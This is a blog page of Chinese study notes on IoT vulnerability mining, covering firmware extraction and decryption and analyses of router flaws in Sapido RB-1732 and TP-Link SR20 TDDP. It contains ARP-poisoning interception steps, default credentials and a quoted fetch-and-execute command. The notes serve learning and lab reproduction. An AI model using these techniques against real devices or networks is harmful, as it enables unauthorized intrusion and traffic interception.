@@ -1,0 +1,572 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>IOT-security-vulnerabilities-mining | wd-z711&#39;s B10g</title>
+  <meta name="author" content="wd-z711">
+  
+  <meta name="description" content="this page is about iot vulnerability mining. It shows iot device&#39;s component like PCB, flash and etc. Secondly, file system is described, and talk about these characteristics.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="IOT-security-vulnerabilities-mining"/>
+  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'G-YHJSKZDC3Y', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> IOT-security-vulnerabilities-mining</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> this page is about iot vulnerability mining. It shows iot device's component like PCB, flash and etc. Secondly, file system is described, and talk about these characteristics.
+		 </div> <!-- alert -->
+	  		
+
+	  <h1 id="《物联网安全漏洞挖掘实战》读书笔记"><a href="#《物联网安全漏洞挖掘实战》读书笔记" class="headerlink" title="《物联网安全漏洞挖掘实战》读书笔记"></a>《物联网安全漏洞挖掘实战》读书笔记</h1><p>&emsp;今年暑假打算读两本书：《物联网安全漏洞挖掘实战》与《C++反汇编与逆向分析》。这本比较薄，就先读这个，跟着做做实验。</p>
+<p>&emsp;随书附件并不全，我这里丰富了<a target="_blank" rel="noopener" href="https://github.com/WD-2711/re_files/tree/main/IOT%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">一下</a>。</p>
+<h2 id="0x00-物联网设备硬件分析"><a href="#0x00-物联网设备硬件分析" class="headerlink" title="0x00 物联网设备硬件分析"></a>0x00 物联网设备硬件分析</h2><p>&emsp;首先，我们要知道物联网设备一般是由什么组成的。</p>
+<span id="more"></span>
+<p><img src="/images/IOT-security-vulnerabilities-mining/%E7%A1%AC%E4%BB%B6%E7%BB%84%E6%88%90.png" alt="硬件组成"></p>
+<p>&emsp;在这里不说电压、电流、电阻、电容了，高中物理都学过。主要补充一下晶体管，其常见用处为：电流放大器（接收小电流并放大输出）。</p>
+<p>&emsp;那我们要用个人PC调试物联网设备，就必须在物联网设备与PC之间建立通信。常见的通信方法如下所示：</p>
+<p>（1）通用异步收发传输器UART。负责串行数据与并行数据转换，主机与设备之间的通信。发送端UART将CPU的并行数据转为串行形式，接收端UART又转回并行。UART传输的数据组成数据包，其结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|起始位（1B）|数据位（5B-9B）|奇偶校验位（0B-1B）|停止位（1B-2B）|</span><br></pre></td></tr></table></figure>
+<p>&emsp;为了方便调试，UART引脚都会在PCB上。引脚连接方式为：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230718141152438.png" alt="image-20230718141152438" style="zoom:67%;" /></p>
+<p>（2）联合测试工作组JTAG。芯片内部专门封装了测试访问端口TAP，使用专门的JTAG测试工具可以进行测试。其所需的引脚比UART多。</p>
+<p>&emsp;如果要用UART方法对设备进行调试，那么我们首先<strong>要找到PCB板上的：<code>Rx|Tx|GND|VCC</code>引脚。</strong>如果没有丝印的话，我们就需要使用万用表等设备来识别这4个引脚。使用万用表可以很容易的找到<code>GND|VCC</code>，<code>GND</code>的电压为0，<code>VCC</code>的电压为<code>3.3V</code>。之后，使用<code>JTAGulator</code>（识别引脚的硬件），将设备引脚与<code>JTAGulator</code>相连，将<code>JTAGulator</code>连到PC上。最后，使用软件<code>SecureCRT</code>与<code>JTAGulator</code>交互，使用命令<code>u</code>即可识别。（未实验，没有硬件呜呜）</p>
+<p>&emsp;之后，我们要识别设备的波特率（数据的传输速率），只有波特率一致，通信双方才能得到准确数据。按上一段的方法做，就可以得到波特率。也可以使用<code>CH340</code>转换芯片来识别。<code>CH340</code>功能为USB与UART串行接口（即TTL）的转换。</p>
+<p>&emsp;最后，我们可以进行调试。使用<code>CH340</code>芯片，将<code>CH340</code>的<code>RX|TX|GND</code>连到物联网设备的<code>TX|RX|GND</code>，并将<code>CH340</code>使用USB连到PC，之后配置软件<code>SecureCRT</code>，就可以看到输出数据。</p>
+<p>&emsp;作为设备提供商，我们肯定不想让别人调试我们的设备，因此要对我们的设备做一些防护：</p>
+<p>（1）去掉丝印，关闭UART、JTAG调试接口。</p>
+<p>（2）存储芯片保存着设备的好多敏感信息，出厂前对存储芯片做加密。</p>
+<h2 id="0x01-物联网固件分析"><a href="#0x01-物联网固件分析" class="headerlink" title="0x01 物联网固件分析"></a>0x01 物联网固件分析</h2><p>&emsp;首先，我们要知道，什么是固件？</p>
+<p>&emsp;固件是系统最基础、最底层的软件，其决定了硬件设备都有什么功能。固件可以当作物联网设备的操作系统，执行控制、监视与数据处理的功能。</p>
+<p>&emsp;固件中比较重要的部分是文件系统。用户在使用文件系统保存数据时，无需关心数据保存在硬盘的哪个数据块中，只需要记住文件所属目录与文件名即可。因此，文件系统实际上是管理硬盘的软件系统。</p>
+<p>&emsp;文件系统的种类如下：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F.png" alt="文件系统" style="zoom:80%;" /></p>
+<p>&emsp;在分析固件之前，我们如何拿到固件呢？最简单的方法是直接从官网下载。但是有的厂商并不在官网上提供固件下载功能，此时可以用流量拦截的方法获得固件。大概做法是：在设备升级时，对设备进行流量代理转发，来实施中间人（MITM）攻击。具体步骤如下（由于书中并未给需要升级的固件样本，因此也无法复现orz）：</p>
+<p>（1）在kali上启动ip转发功能（将数据包从某端口转发到另一端口）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure>
+<p>（2）使用ettercap进行ARP攻击。</p>
+<p>&emsp;（a）<code>ettercap -G</code>启动<code>ettercap</code>，并在配置界面选择当前网卡。</p>
+<p>&emsp;（b）查找本网段所有设备的<code>ip</code>与<code>mac</code>。</p>
+<p>&emsp;（c）将本网络网段地址（例如<code>192.168.1.1</code>）添加到<code>Target1</code>，将要欺骗的IP地址（例如物联网设备/也可以是物联网APP端的IP为<code>192.168.1.100</code>）添加到<code>Target2</code>。</p>
+<p>&emsp;（d）在选项栏找到<code>ARP poisoning</code>并点击，并选择<code>sniff remote connection</code>。这样的话物联网设备的流量就可以转发到kali虚拟机上。</p>
+<p>&emsp;（e）在kali上运行<code>tcpdump -i eth0 -A -w catch.pacap -vv</code>，<code>-A</code>代表以ASCII文本形式输出抓包内容，<code>-vv</code>则是输出详细的调试信息，包括源IP、目的IP等。之后，在物联网设备上点击固件升级，就可以抓到包。</p>
+<p>&emsp;（f）使用wireshark分析一下，就可以找到下载固件的网址。</p>
+<p>&emsp;还有一种获得固件的方法，就是使用编程器（可编程的集成线路，可以修改只读存储器中的程序）从物联网设备的闪存中读取固件。例如使用<code>RT809F</code>编程器，连接到物联网设备芯片上，并使用配套软件读取设备的固件。</p>
+<p>&emsp;此外，还可以通过调试来提取固件。如果设备提供了调试串口，那么我们就可以通过串口进入<code>shell/U-Boot</code>，并进行固件提取。具体步骤如下：</p>
+<p>（1）PC端打开<code>minicom</code>（类似于<code>SecureCRT</code>的工具），配置好调试的接口与波特率，并监听串口。</p>
+<p>（2）使用某些快捷键，可以进入<code>U-Boot</code>模式（具体看书P53）。<code>U-Boot</code>中可能会有<code>mem|flash</code>指令。<code>mem</code>可以显示内存中指定位置的数据，并将内存中的数据进行<code>dump</code>。而<code>flash -layout</code>指令可以查看闪存的布局情况。</p>
+<p>（3）使用<code>flash -read</code>命令将闪存中的固件读取到内存的某个位置，最后使用<code>mem -dump</code>将已保存到内存中的固件保存到<code>.bin</code>文件中。</p>
+<p>&emsp;提取好固件之后，我们就要对固件进行分析。固件中包含<code>BootLoader</code>、内核、文件系统以及其他内容。其中文件系统包含程序源码等，我们要重点研究。</p>
+<p>&emsp;我们可以通过文件系统的签名来提取出固件中的文件系统，也可以使用<code>binwalk</code>来提取文件系统。</p>
+<p>&emsp;首先介绍通过签名来提取文件系统的方法。不同的文件系统使用的签名是不同的，如下表所示：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>文件系统的类型</th>
+<th>签名</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SquashFS</td>
+<td>sqsh、hsqs、sqlz、qshs、hsqt、shsq</td>
+</tr>
+<tr>
+<td>YAFFS</td>
+<td>\x03\x00\x00\x00\x01、\x00\x00\x00\xFF\xFF</td>
+</tr>
+<tr>
+<td>CramFS</td>
+<td>0x28cd3d45</td>
+</tr>
+<tr>
+<td>JFF32</td>
+<td>0x1985</td>
+</tr>
+<tr>
+<td>MemFS</td>
+<td>owowowowowowowo</td>
+</tr>
+<tr>
+<td>ROMFS</td>
+<td>-rom1fs-\0</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>&emsp;上述签名中，<code>sqsh/hsqs</code>分别表示大端/小端文件系统，<code>sqlz</code>是LZMA压缩过的大端文件系统，<code>hsqt/shsq</code>分别表示<code>DD-WRT（开源的第三方固件）/D-Link</code>常用的小端文件系统。</p>
+<p>&emsp;以<code>D-Link</code>路由器中的<code>SquashFS</code>文件系统为例子，来提取其文件系统。</p>
+<p>（1）在固件中检索签名字符串。例如，查找到字符串<code>hsqs</code>在地址<code>0x00150094</code>处。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C iot.bin | grep &quot;sqsh\|hsqs\|sqlz\|qshs\|hsqt\|shsq&quot;</span><br></pre></td></tr></table></figure>
+<p>（2）提取固件。其中，<code>if</code>为输入文件，<code>bs</code>为输出大小，<code>of</code>为输出文件名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=iot.bin bs=1 skip=1376404 of=iot1</span><br></pre></td></tr></table></figure>
+<p>（3）使用<code>file iot1</code>查看解压出来的文件系统是否正确。</p>
+<p>（4）运行<code>unsquashfs iot1</code>提取出整个文件系统（使用随书文件的<code>DIR822C1_FW303WWb04_i4sa_middle.bin</code>）。 </p>
+<p>&emsp;使用<code>binwalk</code>提取文件系统则较为简单。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk iot.bin // 查看固件的详细信息</span><br><span class="line">binwalk -Me iot.bin // 提取文件系统，-M代表递归分解扫描出来的文件，-e代表按照定义的配置文件中的提取方法从固件中提取文件系统</span><br></pre></td></tr></table></figure>
+<p>&emsp;提取完文件系统之后，就是要分析文件系统。可以使用<code>firmwalker</code>脚本来分析文件系统，也可以使用<code>trommel</code>（感觉<code>trommel</code>更精细）。</p>
+<p>&emsp;某些工具提供了更先进的功能，例如<code>emba/FACT</code>可以自动分析固件，具体说明看书P71左右。<code>emba</code>安装了两天，其中的<code>cve-search</code>总是按不好，最终终于搭建好了，总体感觉<code>emba</code>是一个很可以全面的固件分析工具，无需提取出文件系统。而<code>FACT</code>则是一个图形化分析工具，也是无需提取出文件系统。<strong>最后是都搭好了，花了3天。</strong></p>
+<p>&emsp;我们有的时候需要运行固件，但是没有钱买相应的设备，此时我们可以使用软件来对固件进行模拟。我们可以使用很多种软件进行模拟：</p>
+<p>（1）qemu模拟。qemu有两种运行模式：用户模式/系统模式。<strong>用户模式可以运行模拟运行某些程序，而系统模式则是模拟了一个计算机系统（ctf经常搭建的那种）。</strong>除了能够模拟不同硬件架构下应用程序的运行环境之外，也能使用调试模式来调试程序。</p>
+<p>&emsp;物联网设备的处理器架构有ARM与MIPS两种。MIPS是一种精简指令集的处理器结构，分为mips（大端模式）与mipsel（小端模式）。书中以上面解压的文件系统为例，使用用户模式运行了<code>/bin/busybox</code>，使用系统模式运行了此文件系统，具体步骤见书P80，这里就不具体说了，主要是操作。</p>
+<p>（2）Firmware Analysis Toolkit（FAT：固件分析工具集）。FAT是一个自动化脚本，其底层是<code>qemu</code>。非常简单，直接<code>python fat.py firmware_name</code>即可，但是我搭好了之后它一直卡在<code>Extracting the firmware...</code>环节。</p>
+<p>（3）FirmAE也是一种模拟方法，它并不是模拟硬件环境，而是会分析固件仿真失败的原因，并给出一种通用的解决方法。因此，并不是每次硬件模拟都一定成功（可能没有给出解决此硬件的方法）。</p>
+<p>&emsp;如今，大多数的厂商会对固件做加密，这样的话前面所讲的提取文件系统的方法就会失效。固件的加密方式一般有3种：</p>
+<p>（1）如下图所示。此时可以在<code>v1.1</code>中提取解密程序，对<code>v1.2</code>进行解密。</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230718204640387.png" alt="image-20230718204640387" style="zoom:67%;" /></p>
+<p>（2）如下图所示。此时可以提取<code>v1.2</code>中的新版解密程序，对<code>v1.4</code>进行解密。</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230718204847445.png" alt="image-20230718204847445" style="zoom:67%;" /></p>
+<p>（3）如下图所示。此时很难提取出固件。此时可以通过购买设备，通过串口调试，尝试从硬件中提取出固件。</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230718204936175.png" alt="image-20230718204936175" style="zoom:67%;" /></p>
+<p>&emsp;举一个例子来说明。在<a target="_blank" rel="noopener" href="https://support.dlink.com/productinfo.aspx?m=DIR-822-US">链接</a>中下载D-Link DIR-822-US路由器3.15B02的固件，使用<code>binwalk iot.bin -E</code>查看熵，发现接近1，因此这是加密的固件。从此固件的文档中，可以发现：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230718210129485.png" alt="image-20230718210129485" style="zoom:67%;" /></p>
+<p>&emsp;其是由<code>v303WWb04_middle</code>升级而来的。因此，我们下载<code>v303WWb04_middle</code>固件（并未找到，是在随书资源中找的）。此固件并未加密，可以使用<code>binwalk</code>提取文件系统。</p>
+<p>&emsp;由于<code>v303WWb04_middle</code>的作用是升级，因此我们搜索此文件系统中的<code>update|firmware|upgrade|download</code>等字符串，命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rEl &quot;update|firmware|upgrade|download&quot; squashfs-root</span><br></pre></td></tr></table></figure>
+<p>&emsp;<code>-r</code>表示迭代搜目录，<code>-E</code>表示启动正则表达式，<code>-l</code>代表输出文件名。</p>
+<p>&emsp;其中，重点关注<code>StartFirmwareDownload.php</code>文件。</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230718211543567.png" alt="image-20230718211543567" style="zoom:67%;" /></p>
+<p>&emsp;查看文件，发现有：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230718211756110.png" alt="image-20230718211756110" style="zoom:67%;" /></p>
+<p>&emsp;上述代码运行逻辑为：</p>
+<p>（1）将<code>/etc/config/image_sign</code>文件中的内容读取到了<code>$image_sign</code>中。</p>
+<p>（2）将<code>encimg -d -i $fw_path -s $image_sign &gt; /dev/console</code>命令写入了一个名为<code>$ShellPath</code>的文件中，此命令的作用是使用<code>encimg</code>对某个文件进行解密，并将解密后的内容输出到控制台。</p>
+<p>&emsp;查看<code>/etc/config/image_sign</code>的值，为<code>wrgac43s_dlink.2015_dir822c1</code>。</p>
+<p>&emsp;接下来查找<code>encimg</code>文件，其路径在文件系统的<code>usr/sbin</code>中。查看<code>encimg</code>的信息：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230718213058064.png" alt="image-20230718213058064" style="zoom:67%;" /></p>
+<p>可以使用qemu的用户模式模拟运行此文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 将which qemu-mips-static放到要模拟的文件系统根目录下</span><br><span class="line">sudo cp $(which qemu-mips-static) ./squashfs-root </span><br><span class="line"># 意思是将文件执行根变为squashfs-root，用qemu-mips-static运行./usr/sbin/encimg。</span><br><span class="line">sudo chroot ./squashfs-root ./qemu-mips-static ./usr/sbin/encimg -d -i ./DIR822C1_FW315WWb02.bin -s wrgac43s_dlink.2015_dir822c1</span><br></pre></td></tr></table></figure>
+<p>&emsp;其实，这个例子是上述第2种情况。其实现的根本是未加密的中间固件使用的解密程序与升级后的固件使用的解密程序相同。此时查看熵，发现已经不全接近1。如下图所示：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230718214433333.png" alt="image-20230718214433333" style="zoom:67%;" /></p>
+<p>&emsp;当前，厂商大多从两个方面保护固件：</p>
+<p>（1）使用只读文件系统（例如SquashFS），防止攻击者篡改运行时的系统。</p>
+<p>（2）固件升级的时候，有时通过流量拦截获取固件。这是因为，固件在传输过程中未加密（未使用HTTPS），且固件包的名字也未混淆。可以在这两方面进行安全性加强。</p>
+<h2 id="0x02-物联网固件漏洞利用"><a href="#0x02-物联网固件漏洞利用" class="headerlink" title="0x02 物联网固件漏洞利用"></a>0x02 物联网固件漏洞利用</h2><h3 id="Sapido-RB-1732路由器命令执行漏洞"><a href="#Sapido-RB-1732路由器命令执行漏洞" class="headerlink" title="Sapido RB-1732路由器命令执行漏洞"></a>Sapido RB-1732路由器命令执行漏洞</h3><h4 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h4><p>&emsp;该漏洞产生的原因是：服务器（指的是路由器）的<code>syscmd.asp</code>页面没有对传来的参数进行过滤，因此用户可以以参数的形式将系统命令发送给服务器，并在服务器上执行。</p>
+<p>&emsp;由于官网链接无效，找来找去只找到<code>RB-1732_TC_v2.0.43.bin</code>，我会放到我的github中。</p>
+<p>（1）使用<code>binwalk</code>解压缩，得到文件系统。</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719160503602.png" alt="image-20230719160503602" style="zoom:67%;" /></p>
+<p>（2）找到<code>sycsmd.asp</code>的位置，发现在<code>./squashfs-root/web</code>下，并查看源代码：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719160756662.png" alt="image-20230719160756662" style="zoom:67%;" /></p>
+<p>&emsp;可以发现，当用户提交表单时，浏览器将会向这个<code>/goform/formSysCmd</code>发送 POST 请求，并将表单数据发送到服务器，且定义了一个<code>name=formSysCmd</code>。搜索字符串<code>formSysCmd</code>，可以发现：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719161227382.png" alt="image-20230719161227382" style="zoom:67%;" /></p>
+<p>&emsp;在<code>asp</code>中的文件大多是定义<code>form</code>，且并没有<code>/goform/formSysCmd</code>，因此我们猜测这个文件被集成到了<code>/bin/webs</code>中。</p>
+<p>（3）使用<code>ida</code>分析<code>/bin/webs</code>，可以找到<code>formSysCmd</code>函数：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719163305338.png" alt="image-20230719163305338" style="zoom:67%;" /></p>
+<p>&emsp;可以发现，<code>sysCmd</code>中的数据传给了<code>v3</code>，<code>v3</code>又传给了<code>v20</code>，然后直接运行<code>v20</code>，并未做过滤。因此导致了命令执行漏洞。</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>&emsp;<strong>一开始用FAT与FirmAE都能正常启动，但是用浏览器访问就访问不到，最后才发现是ubuntu代理配置的原因。</strong></p>
+<p><strong>Step1：</strong>访问主页面，使用<code>admin/admin</code>登录。</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230721004214787.png" alt="image-20230721004214787" style="zoom:67%;" /></p>
+<p><strong>Step2：</strong>直接访问<code>http://192.168.1.1/syscmd.asp</code>，可以进行命令执行，发现：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230721004354888.png" alt="image-20230721004354888" style="zoom:60%;" /></p>
+<h3 id="TP-Link-Smart-Home-Router远程代码执行漏洞"><a href="#TP-Link-Smart-Home-Router远程代码执行漏洞" class="headerlink" title="TP-Link Smart Home Router远程代码执行漏洞"></a>TP-Link Smart Home Router远程代码执行漏洞</h3><h4 id="TP-Link-Smart-Home-Router背景"><a href="#TP-Link-Smart-Home-Router背景" class="headerlink" title="TP-Link Smart Home Router背景"></a>TP-Link Smart Home Router背景</h4><p>&emsp;TP-Link Smart Home Router（SR20）路由器是一款同时支持<code>Zigbee</code>与<code>Z-ware</code>的物联网协议，是可触屏的路由器。此路由器使用TP-Link设备调试协议（TDDP）。</p>
+<p>&emsp;下面来介绍一下TDDP协议：</p>
+<p>&emsp;TDDP是TP-Link自研的协议，运行在UDP的1040端口上，此协议的v1版本存在远程代码执行漏洞。由于TDDP v1不存在验证功能，因此向SR20的UDP 1040端口发数据时，SR20都会接收并进行验证。TDDP数据包的格式如下：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719165343877.png" alt="image-20230719165343877" style="zoom:67%;" /></p>
+<p>&emsp;上述图片来源于<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1987863">此链接</a>。</p>
+<h4 id="漏洞成因分析-1"><a href="#漏洞成因分析-1" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h4><p>&emsp;此固件是随书资源。</p>
+<p>&emsp;漏洞点在于：<strong>如果发送的TDDP的数据第2字节为<code>0x31</code>，SR20就会连接发送该请求的设备的TFTP服务，并下载相应的文件，并以<code>root</code>权限执行此文件。</strong></p>
+<p>&emsp;下面开始一步一步分析漏洞成因：</p>
+<p>（1）使用<code>binwalk</code>提取文件系统，并搜索与<code>TDDP</code>相关的二进制程序，发现<code>./usr/bin/tddp</code>程序。</p>
+<p>（2）分析<code>tddp</code>主函数，如下：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719170805755.png" alt="image-20230719170805755" style="zoom:67%;" /></p>
+<p>&emsp;其中，<code>sub_16418</code>函数会循环执行，猜测<code>tddp</code>一直循环，直到收到一个数据包。因此猜测<code>sub_16418</code>是处理包的函数，跟踪此函数：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719172103549.png" alt="image-20230719172103549" style="zoom:67%;" /></p>
+<p>&emsp;上图第1个红框代表接收数据，并保存在<code>a1+0xB01B</code>中。而第2个红框则是判断数据的第1个字节，也就是<code>tddp</code>版本是否为1。可以猜测，<code>sub_15E74</code>是关键函数，因为其不仅在<code>v2==1</code>条件下，而且参数中有刚接收到的数据包。因此，跟进<code>sub_15E74</code>：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719173114378.png" alt="image-20230719173114378" style="zoom:67%;" /></p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719173135408.png" alt="image-20230719173135408" style="zoom:67%;" /></p>
+<p>&emsp;可以发现，其是一个<code>switch case</code>的结构，由于<code>a1+0xB01C</code>代表数据包的第2个字节，当第2个字节为<code>0x31</code>时，运行<code>sub_A580</code>函数，跟进此函数：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719173910312.png" alt="image-20230719173910312" style="zoom:67%;" /></p>
+<p>&emsp;跟进一下<code>sub_91DC</code>函数：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719174304359.png" alt="image-20230719174304359" style="zoom:67%;" /></p>
+<p>&emsp;表示调用<code>cd /tmp; tftp -gr file 192.168.x.x</code>指令，从发送者ip（<code>192.168.x.x</code>）中下载名为<code>file</code>的文件。</p>
+<p>&emsp;接着看<code>sub_A580</code>函数，发现：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719174559842.png" alt="image-20230719174559842" style="zoom:67%;" /></p>
+<p>&emsp;表示运行刚刚下载下来的名为<code>file</code>的脚本。</p>
+<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>&emsp;我们查看此固件的架构（查看提取出的文件系统中任意一个可执行文件的架构）：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230721005048234.png" alt="image-20230721005048234" style="zoom:67%;" /></p>
+<p>&emsp;发现是32位的ARM架构。</p>
+<p>&emsp;准备使用qemu模拟：</p>
+<p><strong>Step1：</strong>下载模拟所需的<code>debian</code>操作系统磁盘映像文件（<code>debian_wheezy_armhf_standard.qcow2</code>），linux内核映像文件（<code>initrd.img-3.2.0-4-vexpress</code>），linux内核可执行文件（<code>vmlinuz-3.2.0-4-vexpress</code>）。</p>
+<p><strong>Step2：</strong>配置虚拟网卡，使得虚拟机与物理机可以进行通信。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0 -u username  // 配置虚拟网卡</span><br><span class="line">sudo ifconfig tap0 10.10.10.1/24 // 网卡的网段 </span><br></pre></td></tr></table></figure>
+<p>&emsp;启动qemu-arm虚拟机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">-net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">-nographic  # 不加的话就不出错，不知道为啥</span><br></pre></td></tr></table></figure>
+<p>&emsp;以<code>root/root</code>登录系统，并设置qemu虚拟机的ip地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 10.10.10.2/24</span><br></pre></td></tr></table></figure>
+<p>&emsp;通过<code>wget</code>下载宿主机上打包好的<code>squashfs-root</code>。并切换根路径（切换到<code>squashfs-root</code>下）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot ./squashfs-root sh</span><br></pre></td></tr></table></figure>
+<p>&emsp;由于qemu虚拟机要通过<code>tftp</code>下载宿主机上的文件，因此需要在虚拟机（本来就有此服务）和宿主机中安装<code>tftp</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install atftpd # 宿主机上安装</span><br></pre></td></tr></table></figure>
+<p>&emsp;虚拟机中启动<code>./usr/bin/tddp</code>，此时qemu虚拟机将等待宿主机发包。</p>
+<p>&emsp;修改宿主机中<code>tftp</code>的配置（<code>/etc/default/atftpd</code>）：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230721203747095.png" alt="image-20230721203747095" style="zoom:67%;" /></p>
